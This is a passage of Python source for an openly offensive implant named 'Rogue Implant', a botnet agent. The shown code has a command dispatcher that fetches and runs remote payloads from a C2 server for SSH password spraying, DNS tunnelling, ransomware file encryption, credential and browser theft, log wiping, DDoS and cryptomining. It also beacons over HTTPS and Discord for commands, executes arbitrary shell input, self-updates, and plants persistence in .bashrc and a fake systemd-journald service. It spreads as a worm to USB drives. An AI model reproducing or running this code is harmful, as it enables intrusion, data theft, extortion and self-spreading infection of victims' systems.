                return subprocess.getoutput(f"python3 {os.path.join(HIDDEN_DIR, 'logcleaner.py')} --all")
            else:
                print(f"[+] Cleaning logs: {parts[1]}")
                return subprocess.getoutput(f"python3 {os.path.join(HIDDEN_DIR, 'logcleaner.py')} {parts[1]}")
        else:
            fetch_payload("logcleaner.py")
            print("[+] Cleaning implant logs")
            return run_payload("logcleaner.py")

    elif cmd.startswith("trigger_sshspray"):
        """SSH credential spraying attack"""
        fetch_payload("sshspray.py")
        parts = cmd.split()
        if len(parts) > 1:
            # Parse arguments: trigger_sshspray <target> <userlist> <passlist>
            if len(parts) >= 4:
                target = parts[1]
                userlist = parts[2]
                passlist = parts[3]
                print(f"[+] Starting SSH spray attack on {target}")
                return subprocess.getoutput(f"python3 {os.path.join(HIDDEN_DIR, 'sshspray.py')} {target} {userlist} {passlist}")
            else:
                return "[!] Usage: trigger_sshspray <target> <userlist> <passlist>"
        else:
            print("[+] Starting SSH spray with default settings")
            return run_payload("sshspray.py")

    elif cmd.startswith("trigger_dnstunnel"):
        """DNS tunneling C2 channel"""
        parts = cmd.split()
        if len(parts) > 1 and parts[1] == "stop":
            print("[+] Stopping DNS tunnel")
            return subprocess.getoutput("pgrep -f dnstunnel.py && pkill -f dnstunnel.py || echo '[-] No DNS tunnel running.'")
        else:
            fetch_payload("dnstunnel.py")
            print("[+] Starting DNS tunneling")
            # Start in background thread
            threading.Thread(target=lambda: run_payload("dnstunnel.py")).start()
            return "[*] DNS tunnel started in background"

    elif cmd == "trigger_autodeploy":
        """Auto-deploy to network"""
        fetch_payload("autodeploy.py")
        print("[+] Starting auto-deployment to network")
        # Start in background thread as it will take time
        threading.Thread(target=lambda: run_payload("autodeploy.py")).start()
        return "[*] Auto-deployment started in background"

    elif cmd == "trigger_network_scan":
        """Network scanning and host discovery"""
        fetch_payload("network_scanner.py")
        print("[+] Starting network scan")
        return run_payload("network_scanner.py")

    elif cmd == "trigger_persistence_setup":
        """Set up additional persistence mechanisms"""
        fetch_payload("persistence.py")
        print("[+] Setting up additional persistence")
        return run_payload("persistence.py")

    elif cmd == "trigger_defense_evasion":
        """Execute defense evasion techniques"""
        fetch_payload("defense_evasion.py")
        print("[+] Starting defense evasion")
        return run_payload("defense_evasion.py")

    elif cmd == "trigger_lateral_move":
        """Attempt lateral movement"""
        fetch_payload("lateral_movement.py")
        print("[+] Attempting lateral movement")
        return run_payload("lateral_movement.py")

    elif cmd == "trigger_forensics_check":
        """Check for forensic artifacts"""
        fetch_payload("forensics_check.py")
        print("[+] Checking for forensic artifacts")
        return run_payload("forensics_check.py")
    
    # === ADVANCED PAYLOADS - NEW ADDITIONS ===
    
    elif cmd == "trigger_procinject":
        """Process injection for stealth execution"""
        fetch_payload("process_inject.py")
        print("[+] Starting process injection module")
        return run_payload("process_inject.py")
    
    elif cmd == "trigger_filehide":
        """Advanced file hiding techniques"""
        fetch_payload("advanced_filehider.py")
        print("[+] Starting advanced file hiding")
        return run_payload("advanced_filehider.py")
    
    elif cmd == "trigger_cronpersist":
        """Advanced cron persistence methods"""
        fetch_payload("advanced_cron_persistence.py")
        print("[+] Setting up advanced cron persistence")
        return run_payload("advanced_cron_persistence.py")
    
    elif cmd == "trigger_compclean":
        """Competitor/malware cleaner"""
        fetch_payload("competitor_cleaner.py")
        print("[+] Starting competitor cleanup")
        return run_payload("competitor_cleaner.py")
    
    # === FILE ENCRYPTION PAYLOAD ===
    
    elif cmd.startswith("trigger_fileransom"):
        """File encryption/decryption ransomware"""
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: trigger_fileransom <encrypt/decrypt> <path> [password] OR trigger_fileransom encrypt system_<mode> [password]"
        
        action = parts[1]
        fetch_payload("fileransom.py")
        
        # Build command for the payload
        payload_path = os.path.join(HIDDEN_DIR, "fileransom.py")
        
        if action == "encrypt":
            if len(parts) >= 3:
                target = parts[2]
                
                # Check for system-wide modes
                if target.startswith("system_"):
                    # System-wide encryption
                    mode = target
                    cmd_args = f"encrypt --mode {mode}"
                elif target == "all":
                    # Encrypt all user files
                    cmd_args = f"encrypt all"
                else:
                    # Normal path encryption
                    cmd_args = f"encrypt \"{target}\""
            else:
                cmd_args = "encrypt"
            
            # Optional custom password
            if len(parts) >= 4:
                password = parts[3]
                cmd_args += f" --custom-password \"{password}\""
            
            print(f"[+] Starting file encryption")
            return subprocess.getoutput(f"python3 \"{payload_path}\" {cmd_args}")
        
        elif action == "decrypt":
            if len(parts) < 3:
                return "[!] Usage: trigger_fileransom decrypt <path/system_wide> <password>"
            
            target = parts[2]
            
            if target == "system_wide":
                # System-wide decryption
                if len(parts) < 4:
                    return "[!] Usage: trigger_fileransom decrypt system_wide <password>"
                
                password = parts[3]
                cmd_args = f"decrypt system_wide --password \"{password}\""
            else:
                # Normal decryption
                if len(parts) < 4:
                    return "[!] Usage: trigger_fileransom decrypt <path> <password>"
                
                password = parts[3]
                cmd_args = f"decrypt \"{target}\" --password \"{password}\""
            
            print(f"[+] Starting file decryption")
            return subprocess.getoutput(f"python3 \"{payload_path}\" {cmd_args}")
        
        else:
            return "[!] Unknown action. Use 'encrypt' or 'decrypt'"
    
    # === COMPOUND TRIGGERS ===
    
    elif cmd == "trigger_full_recon":
        """Execute full reconnaissance suite"""
        print("[+] Starting full reconnaissance suite")
        results = []
        results.append("=== FULL RECONNAISSANCE SUITE ===")
        
        # System reconnaissance
        fetch_payload("sysrecon.py")
        results.append("\n[1] System Reconnaissance:")
        results.append(run_payload("sysrecon.py"))
        
        # Privilege escalation check
        fetch_payload("linpeas_light.py")
        results.append("\n[2] Privilege Escalation Check:")
        results.append(run_payload("linpeas_light.py"))
        
        # Hash dump
        fetch_payload("hashdump.py")
        results.append("\n[3] Password Hash Extraction:")
        results.append(run_payload("hashdump.py"))
        
        # Network scan
        fetch_payload("network_scanner.py")
        results.append("\n[4] Network Scan:")
        results.append(run_payload("network_scanner.py"))
        
        return "\n".join(results)

    elif cmd == "trigger_clean_sweep":
        """Clean all forensic traces and restart stealthily"""
        print("[+] Starting clean sweep operation")
        results = []
        
        # Clean logs first
        fetch_payload("logcleaner.py")
        results.append("[1] Cleaning logs:")
        results.append(run_payload("logcleaner.py"))
        
        # Defense evasion
        fetch_payload("defense_evasion.py")
        results.append("\n[2] Defense evasion:")
        results.append(run_payload("defense_evasion.py"))
        
        # Kill and restart implant
        results.append("\n[3] Restarting implant in stealth mode...")
        results.append("[+] Implant will restart after cleanup")
        
        return "\n".join(results)

    elif cmd == "trigger_harvest_all":
        """Harvest all possible data"""
        print("[+] Starting complete data harvesting")
        results = []
        results.append("=== COMPLETE DATA HARVEST ===")
        
        # Browser data
        fetch_payload("browserstealer.py")
        results.append("\n[1] Browser Data:")
        results.append(run_payload("browserstealer.py"))
        
        # Password hashes
        fetch_payload("hashdump.py")
        results.append("\n[2] Password Hashes:")
        results.append(run_payload("hashdump.py"))
        
        # SSH keys
        results.append("\n[3] SSH Keys:")
        ssh_keys = subprocess.getoutput("find /home /root -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null")
        results.append(ssh_keys[:2000])
        
        # Configuration files
        results.append("\n[4] Configuration Files:")
        config_files = subprocess.getoutput("find /etc -name '*.conf' -o -name '*.cfg' -o -name '*.yml' -o -name '*.yaml' -o -name '*.json' 2>/dev/null | head -20")
        results.append(config_files)
        
        return "\n".join(results)

    # === UTILITY TRIGGERS ===
    
    elif cmd == "trigger_status":
        """Check implant status"""
        print("[+] Checking implant status")
        status = []
        status.append(f"Implant ID: {IMPLANT_ID_HASH}")
        status.append(f"C2 Server: {C2_HOST}")
        status.append(f"Hidden Directory: {HIDDEN_DIR}")
        status.append(f"Process Name: {subprocess.getoutput('ps -p $$ -o comm=')}")
        status.append(f"Uptime: {subprocess.getoutput('uptime')}")
        status.append(f"Memory Usage: {subprocess.getoutput('free -h | head -2')}")
        status.append(f"Network Connections: {len(subprocess.getoutput('netstat -tunap 2>/dev/null | grep ESTABLISHED').splitlines())} established")
        
        # Cloud info if available
        if cloud_implant.cloud_info and cloud_implant.cloud_info.get('is_cloud'):
            status.append(f"Cloud Environment: {cloud_implant.cloud_info.get('provider', 'unknown').upper()}")
            status.append(f"Cloud Type: {cloud_implant.cloud_info.get('type', 'unknown')}")
        
        # Check payloads
        payloads = os.listdir(HIDDEN_DIR) if os.path.exists(HIDDEN_DIR) else []
        python_payloads = [p for p in payloads if p.endswith('.py')]
        status.append(f"Available Payloads: {len(python_payloads)}")
        
        return "\n".join(status)

    elif cmd == "trigger_self_update":
        """Update the implant from C2"""
        print("[+] Starting self-update")
        try:
            # Download latest implant
            url = f"{PAYLOAD_REPO}rogue_implant.py"
            req = urllib.request.Request(
                url,
                headers={
                    'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
                    'X-Implant-ID': IMPLANT_ID_HASH
                }
            )
            response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
            new_implant = response.read()
            
            # Save to temporary location
            temp_file = os.path.join(HIDDEN_DIR, "rogue_implant_new.py")
            with open(temp_file, 'wb') as f:
                f.write(new_implant)
            
            # Replace current implant
            current_file = __file__
            shutil.copy(temp_file, current_file)
            os.chmod(current_file, 0o755)
            os.remove(temp_file)
            
            return "[+] Implant updated successfully. Restart to apply changes."
        except Exception as e:
            return f"[!] Update failed: {e}"

    elif cmd == "trigger_help":
        """Show available triggers"""
        help_text = """
=== ROGUE IMPLANT TRIGGER COMMANDS ===

BASIC OPERATIONS:
  trigger_status           - Check implant status
  trigger_self_update      - Update implant from C2
  trigger_dumpcreds        - Dump credentials from common locations
  trigger_exfil <path>     - Exfiltrate data from specified path
  reverse_shell           - Start reverse shell to C2

CLOUD-AWARE OPERATIONS:
  trigger_cloud_detect    - Detect cloud environment
  trigger_cloud_recon     - Cloud-specific reconnaissance
  trigger_aws_creds       - Steal AWS credentials
  trigger_azure_creds     - Steal Azure credentials
  trigger_gcp_creds       - Steal GCP credentials
  trigger_container_escape - Attempt container escape
  trigger_k8s_creds       - Steal Kubernetes credentials
  trigger_k8s_steal       - Comprehensive Kubernetes secret stealing
  trigger_k8s_target <namespace> [secret] - Targeted Kubernetes secret stealing

RECONNAISSANCE & INTELLIGENCE:
  trigger_sysrecon        - System reconnaissance
  trigger_linpeas         - Linux privilege escalation check
  trigger_hashdump        - Password hash extraction
  trigger_browsersteal    - Browser data theft
  trigger_network_scan    - Network host discovery

ADVANCED PAYLOADS:
  trigger_procinject      - Process injection for stealth execution
  trigger_filehide        - Advanced file hiding techniques
  trigger_cronpersist     - Advanced cron persistence methods
  trigger_compclean       - Clean competitor malware/botnets
  trigger_fileransom encrypt <path> [password] - Encrypt files
  trigger_fileransom encrypt system_<mode> [password] - System-wide encryption
  trigger_fileransom encrypt all [password] - Encrypt all user files
  trigger_fileransom decrypt <path> <password> - Decrypt files
  trigger_fileransom decrypt system_wide <password> - System-wide decryption

MONITORING & COLLECTION:
  trigger_keylogger       - Start keystroke logging
  trigger_keylogger stop  - Stop keylogger
  trigger_screenshot      - Start screen capture
  trigger_screenshot stop - Stop screenshot capture

PERSISTENCE & STEALTH:
  trigger_stealthinject   - Execute polyroot persistence
  trigger_persistence_setup - Set up additional persistence
  trigger_defense_evasion - Execute defense evasion techniques
  trigger_logclean        - Clean system logs
  trigger_logclean all    - Clean all logs aggressively

LATERAL MOVEMENT:
  trigger_sshspray        - SSH credential spraying
  trigger_dnstunnel       - DNS tunneling C2
  trigger_autodeploy      - Auto-deploy to network
  trigger_lateral_move    - Attempt lateral movement

DDoS & CRYPTOMINING:
  trigger_ddos <target> <port> <duration> - DDoS attack
  trigger_mine            - Start cryptominer
  trigger_stopmine        - Stop cryptominer

COMPOUND OPERATIONS:
  trigger_full_recon      - Execute full reconnaissance suite
  trigger_clean_sweep     - Clean forensic traces and restart
  trigger_harvest_all     - Harvest all possible data

UTILITIES:
  trigger_forensics_check - Check for forensic artifacts
  trigger_help           - Show this help message

Use: load_payload <name.py> to download or run_payload <name.py> to execute
        """
        return help_text

    return None

def handle_command(cmd):
    if cmd.startswith("load_payload"):
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: load_payload <filename>"
        payload_name = parts[1]
        result = fetch_payload(payload_name)
        return f"[+] Fetched {payload_name}" if result else f"[!] Failed to fetch {payload_name}"
    
    elif cmd.startswith("run_payload"):
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: run_payload <filename>"
        return run_payload(parts[1])
    
    elif cmd.startswith("trigger_"):
        result = handle_trigger(cmd)
        return result if result else "[!] Trigger failed"
    
    elif cmd == "reverse_shell":
        print("[+] Starting reverse shell thread")
        threading.Thread(target=reverse_shell).start()
        return "[*] Reverse shell started"
    
    else:
        print(f"[+] Executing command: {cmd}")
        return subprocess.getoutput(cmd)

def beacon():
    """Main beacon loop using HTTPS - WITH VISIBLE OUTPUT WHEN MANUAL"""
    silent_mode = should_run_silently()
    
    if not silent_mode:
        print(f"[+] Starting HTTPS beacon to {C2_HOST}")
        print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
    
    beacon_count = 0
    identified = False
    bot_id = None
    
    while True:
        try:
            beacon_count += 1
            
            if not silent_mode:
                print(f"[BEACON #{beacon_count}] Checking in...")
            
            response = send_https_command("beacon")
            
            if not silent_mode:
                print(f"[BEACON #{beacon_count}] Response: {response[:50]}...")
            
            if response and response != "pong":
                if response.startswith("identified:"):
                    bot_id = response.replace("identified:", "", 1)
                    identified = True
                    if not silent_mode:
                        print(f"[+] C2 identified us as: {bot_id}")
                else:
                    if not silent_mode:
                        print(f"[+] Received command: {response}")
                    result = handle_command(response)
                    if not silent_mode:
                        result_preview = result[:100] + "..." if len(result) > 100 else result
                        print(f"[+] Command result: {result_preview}")
                    
                    if result:
                        send_https_command(f"result:{result}")
            
            if not identified and beacon_count == 1:
                if not silent_mode:
                    print(f"[+] Sending identification to C2...")
                send_https_command(f"identify:{IMPLANT_ID_HASH}")
            
            if not silent_mode:
                print(f"[.] Next beacon in 30 seconds...")
            time.sleep(30)
            
        except Exception as e:
            if not silent_mode:
                print(f"[!] Beacon error: {e}")
                print(f"[!] Retrying in 60 seconds...")
            time.sleep(60)

def check_discord_command():
    """Check Discord for commands"""
    try:
        headers = {"Authorization": f"Bot {BOT_TOKEN}"}
        req = urllib.request.Request(DISCORD_COMMAND_URL, headers=headers)
        response = urllib.request.urlopen(req).read().decode()
        latest = json.loads(response)[0]["content"]
        return latest
    except Exception as e:
        print(f"[!] Discord command check failed: {e}")
        return None

def send_to_webhook(content):
    """Send result to Discord webhook"""
    try:
        req = urllib.request.Request(
            DISCORD_WEBHOOK,
            data=json.dumps({"content": content}).encode(),
            headers={"Content-Type": "application/json"},
            method='POST'
        )
        urllib.request.urlopen(req)
    except Exception as e:
        print(f"[!] Discord webhook send failed: {e}")

def discord_loop():
    """Discord fallback command loop"""
    silent_mode = should_run_silently()
    
    if not silent_mode:
        print("[+] Discord beacon active")
    
    last_cmd = ""
    
    while True:
        try:
            cmd = check_discord_command()
            if cmd and cmd != last_cmd:
                if not silent_mode:
                    print(f"[Discord] Received command: {cmd}")
                result = handle_command(cmd)
                encrypted_result = encrypt_response(result).decode()
                send_to_webhook(encrypted_result)
                last_cmd = cmd
        except Exception as e:
            if not silent_mode:
                print(f"[!] Discord loop error: {e}")
        
        time.sleep(30)

def fake_name():
    """Change process name for stealth"""
    try:
        import setproctitle
        setproctitle.setproctitle("systemd-journald")
        print("[+] Process name changed to systemd-journald")
    except:
        pass

def setup_persistence():
    """Set up stealthy persistence"""
    target = os.path.join(HIDDEN_DIR, ".rogue_agent.py")
    
    if not os.path.exists(target):
        shutil.copy(__file__, target)
        
        persistence_script = f'''if [ -z "${{ROGUE_LAUNCHED+x}}" ]; then
    export ROGUE_LAUNCHED=1
    (cd {HIDDEN_DIR} && nohup python3 {target} >/dev/null 2>&1 &)
fi'''
        
        bashrc_path = os.path.expanduser("~/.bashrc")
        if os.path.exists(bashrc_path):
            with open(bashrc_path, 'a') as f:
                f.write(f"\n# System journal service\n{persistence_script}\n")
            print(f"[+] Persistence installed to .bashrc")
        
        return True
    return False

def create_systemd_service(target_path):
    """Create a systemd service file for more robust persistence"""
    service_content = f"""[Unit]
Description=System Journal Service
After=network.target

[Service]
Type=simple
User={os.getlogin()}
WorkingDirectory={HIDDEN_DIR}
ExecStart=/usr/bin/python3 {target_path}
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""
    
    service_file = os.path.join(HIDDEN_DIR, "systemd-journald.service")
    with open(service_file, 'w') as f:
        f.write(service_content)
    
    install_script = os.path.join(HIDDEN_DIR, "install_service.sh")
    with open(install_script, 'w') as f:
        f.write(f"""#!/bin/bash
sudo cp {service_file} /etc/systemd/system/systemd-journald.service
sudo systemctl daemon-reload
sudo systemctl enable --now systemd-journald
""")
    os.chmod(install_script, 0o755)
    print(f"[+] Systemd service created: {service_file}")

def worm_propagate():
    """Worm propagation to removable drives"""
    try:
        drives = subprocess.getoutput("lsblk -o MOUNTPOINT -nr | grep -v '^$'").splitlines()
        for mount in drives:
            if "/media" in mount or "/run/media" in mount:
                try:
                    worm_dir = os.path.join(mount.strip(), ".rogue_worm")
                    os.makedirs(worm_dir, exist_ok=True)
                    shutil.copy(__file__, os.path.join(worm_dir, "rogue_implant.py"))
                    with open(os.path.join(worm_dir, ".bash_login"), "w") as f:
                        f.write(f"if [ -z \"${{ROGUE_WORM_LAUNCHED+x}}\" ]; then export ROGUE_WORM_LAUNCHED=1; (cd {worm_dir} && nohup python3 rogue_implant.py >/dev/null 2>&1 &); fi\n")
                    print(f"[+] Worm propagated to: {worm_dir}")
                except Exception as e:
                    print(f"[!] Worm propagation failed for {mount}: {e}")
    except Exception as e:
        print(f"[!] Worm propagation failed: {e}")

def p2p_listener():
    """P2P listener for bot communication"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    backup_ports = [7008, 7009, 7010, 7011]
    bound = False

    for port in backup_ports:
        try:
            sock.bind(('0.0.0.0', port))
            bound = True
            print(f"[+] P2P listener bound to port {port}")
            break
        except OSError:
            continue

    if not bound:
        print("[!] P2P listener failed to bind")
        return

    while True:
        try:
            data, addr = sock.recvfrom(1024)
            if data.decode() == "Rogue?":
                sock.sendto(b"I'm Rogue", addr)
                print(f"[P2P] Responded to query from {addr}")
        except:
            break

def p2p_broadcast():
    """P2P broadcast to find other bots"""
    ports = [7008, 7009, 7010, 7011]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    while True:
        for port in ports:
            try:
                sock.sendto(b"Rogue?", ('<broadcast>', port))
            except:
                continue
        time.sleep(60)

def cleanup_old_persistence():
    """Remove old aggressive persistence from .bashrc"""
    rc_files = ['.bashrc', '.profile', '.bash_profile']
    for rc_file in rc_files:
        rc_path = os.path.expanduser(f"~/{rc_file}")
        if os.path.exists(rc_path):
            with open(rc_path, 'r') as f:
                lines = f.readlines()
            
            new_lines = [line for line in lines if 'rogue_agent.py' not in line and 'System maintenance' not in line]
            
            if len(new_lines) != len(lines):
                with open(rc_path, 'w') as f:
                    f.writelines(new_lines)
                print(f"[+] Cleaned old persistence from {rc_file}")

# === Main Function ===
def main():
    """Main entry point with smart silent mode and cloud awareness"""
    silent_mode = should_run_silently()
    
    cleanup_old_persistence()
    
    if silent_mode:
        print(f"[+] Rogue Implant starting in silent mode...")
        redirect_output_to_log()
    else:
        print("[+] Rogue Implant starting...")
        print(f"[+] C2 Target: {C2_HOST}:{C2_PORT}")
        print(f"[+] Payload Repo: {PAYLOAD_REPO}")
        print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
    
    # CLOUD DETECTION AND ADAPTATION
    print("[+] Detecting cloud environment...")
    cloud_info = cloud_implant.detect_environment()
    
    if cloud_info.get('is_cloud'):
        provider = cloud_info.get('provider', 'unknown').upper()
        print(f"[CLOUD] Detected: {provider} environment")
        
        # Adapt hidden directory for cloud
        global HIDDEN_DIR
        new_hidden_dir = cloud_implant.adapt_hidden_dir()
        if new_hidden_dir != HIDDEN_DIR:
            HIDDEN_DIR = new_hidden_dir
            os.makedirs(HIDDEN_DIR, exist_ok=True)
            print(f"[CLOUD] Adapted hidden directory to: {HIDDEN_DIR}")
        
        # Fetch cloud-specific payloads
        print("[CLOUD] Fetching cloud-specific payloads...")
        cloud_payloads = cloud_implant.fetch_cloud_payloads()
        
        # Send cloud detection to C2
        if not silent_mode:
            try:
                cloud_report = {
                    'provider': cloud_info.get('provider'),
                    'type': cloud_info.get('type'),
                    'implant_id': IMPLANT_ID_HASH,
                    'timestamp': time.time()
                }
                send_https_command(f"cloud_detected:{json.dumps(cloud_report)}")
            except:
                pass
    else:
        print("[CLOUD] No cloud environment detected")
    
    if silent_mode and os.isatty(0):
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    
    fake_name()
    
    # Use cloud-aware persistence
    if cloud_info.get('is_cloud'):
        cloud_implant.adapt_persistence()
    else:
        setup_persistence()
    
    worm_propagate()
    
    threading.Thread(target=p2p_listener, daemon=True).start()
    threading.Thread(target=p2p_broadcast, daemon=True).start()
    threading.Thread(target=discord_loop, daemon=True).start()
    
    if not silent_mode:
        print("[+] All systems operational. Starting beacon...")
    
    beacon()

# === Launch ===
if __name__ == "__main__":
    main()
